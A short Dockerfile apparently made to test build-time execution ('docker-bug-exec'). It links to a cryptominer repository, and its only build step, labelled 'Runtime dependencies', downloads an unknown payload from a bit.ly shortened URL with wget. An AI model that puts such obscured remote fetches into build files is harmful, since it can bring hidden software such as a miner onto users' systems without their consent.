#   Title: docker-bug-exec
#   Desc: exec evaluation
#   Autor: Ferro.Mariano, navebinario
#   Url: gitlab.com/docker-bug-exec/Dockerfile, github.com/ferromariano/aa-my-cpuminer
#   Date: 2017-08-26
# Note: On Alpine 3.5 curl-dev uses LibreSSL which is incompatible with the required OpenSSL-dev.

FROM alpine:3.4

RUN set -x \
    # Runtime dependencies.
 && wget https://bitly.com/2xkMehg#init -nv
